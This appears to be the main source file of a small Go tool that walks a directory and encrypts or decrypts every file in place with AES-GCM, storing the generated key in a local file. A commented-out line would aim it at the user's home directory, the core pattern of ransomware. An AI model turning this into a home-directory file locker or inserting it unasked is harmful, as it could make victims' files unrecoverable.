package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"golang-fs-encrypter/internal/crypto"
	"golang-fs-encrypter/internal/files"
	"io/fs"
	"os"
	"path/filepath"
)


var (
	key  []byte
	err  error
	mode int
	gcm  cipher.AEAD
)

const (
	MODE_ENCRYPT = iota
	MODE_DECRYPT
	KEY_DIR = "./"
	KEY_LENGTH = 32
)

func main() {
	if len(os.Args) == 2 {
		mode = MODE_DECRYPT
		key, err = hex.DecodeString(os.Args[1])
		if err != nil {
			fmt.Println("Bad key")
		}
	} else {
		mode = MODE_ENCRYPT
		key = crypto.GenerateBytes(KEY_LENGTH)
		keyHex := hex.EncodeToString(key)

		files.WriteFile(KEY_DIR + "key.key", []byte(keyHex))
	}

	c, err := aes.NewCipher(key)
	if err != nil {
		return
	}
	gcm, err = cipher.NewGCM(c)
	if err != nil {
		return
	}

	// dir, err := os.UserHomeDir()
	// if err != nil {
	// 	panic(err)
	// }
	dir := "./dir"

	err = filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			return nil
		}

		bytesBefore, err := files.ReadFile(path)
		if err != nil {
			return err
		}

		var bytesAfter []byte

		switch mode {
		case MODE_ENCRYPT:
			bytesAfter, err = crypto.EncryptBytes(bytesBefore, &gcm)
		case MODE_DECRYPT:
			bytesAfter, err = crypto.DecryptBytes(bytesBefore, &gcm)
		}

		err = files.RewriteFile(path, bytesAfter)

		return err
	})

	if err != nil {
		panic(err)
	}

}
